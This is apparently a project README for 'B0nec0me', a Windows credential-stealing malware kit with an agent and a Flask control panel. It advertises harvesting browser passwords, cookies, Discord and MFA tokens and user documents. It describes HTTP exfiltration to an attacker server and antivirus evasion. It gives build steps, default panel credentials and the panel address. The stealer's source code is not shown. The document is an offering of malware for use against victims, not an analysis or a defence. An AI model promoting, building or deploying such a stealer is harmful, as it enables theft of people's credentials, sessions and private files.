# B0nec0me - Stealer for Skids
B0nec0me is a sophisticated modular stealer engineered specifically for Windows environments. It features an advanced data extraction framework capable of collecting sensitive information such as browser tokens, Discord credentials, cookies, and various user documents. Designed with stealth and efficiency in mind, b0nec0me ensures persistent data exfiltration through its reliable HTTP communication layer. Thanks to its modular architecture, new capabilities can be integrated seamlessly without the need for frequent updates or complex deployment procedures. Once activated on a target system, conventional antivirus and endpoint security solutions struggle to detect or block its activities due to its minimal footprint and native Windows API usage. The system consists of two main components: the Agent, which operates silently on the compromised host to gather and transmit data, and the Server Backend, which provides a centralized web interface for administrators to monitor, manage, and analyze the harvested information. In this framework, each infected machine running the Agent is considered a “bot,” contributing to the overall data collection and control network.

*FYI*: This stealer was created by me and a guy who helped me create the Python server with me. Anyway, b0nec0me had a second part of Linux, but I destroyed both creations and started from scratch.

# General
- Written in C++ using native Windows APIs
- No external dependencies beyond WinAPI and WinHTTP
- Lightweight and modular architecture for easy extension
- Compiled binary optimized for minimal size and stealth
- Utilizes HTTP(S) communication for efficient and reliable data transfer
- Backend server implemented in Python with Flask framework
- Supports asynchronous data sending and robust error handling

# Features
- ***Modular*** token extraction from Chromium-based and Firefox browsers
- Retrieval of ***Discord*** tokens, including multi-factor authentication **(MFA)** tokens
- *Secure* extraction of stored browser passwords
- Local cookie collection and session data **harvesting**
- Targeted file extraction from user directories (e.g., .`txt,` .`pdf`, .`docx`)
- Automated data ***exfiltration*** using HTTP POST requests with WinHTTP
- Centralized backend server with web interface for data management and monitoring
- **Basic** authentication to secure administrative access
- **Configurable** limits on data size and daily file uploads to ensure stability
- Detailed logging and error handling mechanisms for operational transparency

# **Build this Garbage**
Modify the settings you need in `src/config.cpp`, including the server URL, authentication credentials, and other parameters required for communication between the Agent and the backend server.

**Default Server** Credentials:
**Username:** admin
**Password:** changeme123

```ssh
sudo apt install build-essential cmake
mkdir -p build
cd build
cmake ..
make
```
- The compilation process will generate the source files needed to create the agent executable. You must compile the generated source with a compatible C++ compiler on Windows to obtain the deployable agent binary.
**Access the backend server interface:**
Open a web browser and navigate to:

```ssh
http://your-server-ip:5000
```

Login using the default credentials above to manage collected data and bots.
